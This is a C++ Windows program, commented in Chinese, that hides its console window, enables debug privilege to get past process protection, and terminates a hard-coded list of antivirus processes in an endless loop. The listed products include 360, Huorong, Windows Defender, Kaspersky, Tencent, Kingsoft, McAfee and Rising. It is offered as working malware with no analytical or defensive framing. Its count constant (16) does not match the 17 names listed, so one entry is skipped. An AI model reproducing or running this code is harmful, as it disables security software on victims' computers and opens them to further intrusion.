
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>

// 常见安全软件进程列表（宽字符）
const wchar_t* AV_PROCESSES[] = {
    L"360tray.exe", L"360sd.exe", L"ZhuDongFangYu.exe",  // 360系列
    L"Huorong.exe", L"wsctrl.exe",                      // 火绒
    L"MsMpEng.exe", L"MsMpEngCP.exe",                   // Windows Defender
    L"avp.exe", L"avpui.exe",                           // 卡巴斯基
    L"QQPCRTP.exe", L"QQPCTray.exe",                    // 腾讯电脑管家
    L"kxetray.exe", L"kxescore.exe",                    // 金山毒霸
    L"McAfeeFire.exe", L"McShield.exe",                 // 麦咖啡
    L"RavMonD.exe", L"RavStub.exe"                      // 瑞星
};
const int AV_COUNT = 16;

// 进程保护绕过技术（通过调整令牌权限）
bool EnableDebugPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    TOKEN_PRIVILEGES tkp;
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    bool result = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
    CloseHandle(hToken);
    return result;
}

// 进程终止核心函数
void TerminateProcessByName(const wchar_t* procName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, procName) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, 
                                            FALSE, pe.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // 启用调试权限绕过保护
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL)
    {
        ShowWindow(hwnd, SW_HIDE); // 隐藏控制台窗口
    }
    EnableDebugPrivilege();

    while(true){// 终止所有安全软件进程
    	for (int i = 0; i < AV_COUNT; ++i) {
   	    	TerminateProcessByName(AV_PROCESSES[i]);
   		}
}
    return 0;
}

